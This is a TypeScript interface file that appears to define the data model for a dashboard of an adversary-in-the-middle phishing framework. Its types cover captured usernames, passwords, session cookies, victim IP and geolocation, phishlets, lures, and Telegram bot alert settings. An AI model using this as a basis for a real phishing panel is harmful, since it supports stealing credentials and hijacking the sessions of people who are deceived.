export interface GeoData {
  country: string;
  city: string;
  lat: number;
  lon: number;
}

export interface Session {
  id: number;
  phishlet: string;
  landing_url: string;
  username: string;
  password: string;
  remote_addr: string;
  create_time: number;
  tokens: Record<string, Record<string, Cookie>> | string;
  useragent: string;
  formattedDate?: string;
  hasCredentials?: boolean;
  geoData?: GeoData;
}

export interface Cookie {
  Name: string;
  Value: string;
  Path: string;
  Domain: string;
  Expires: string;
  MaxAge: number;
  Secure: boolean;
  HttpOnly: boolean;
  SameSite: number;
  Raw: string;
  Unparsed: string[];
}

export interface Config {
  blacklist: {
    mode: string;
  };
  general: {
    telegram_bot_token: string;
    telegram_chat_id: string;
    autocert: boolean;
    dns_port: number;
    https_port: number;
    bind_ipv4: string;
    external_ipv4: string;
    domain: string;
    unauth_url: string;
  };
  phishlets: Record<string, any>;
  lures: any[];
}
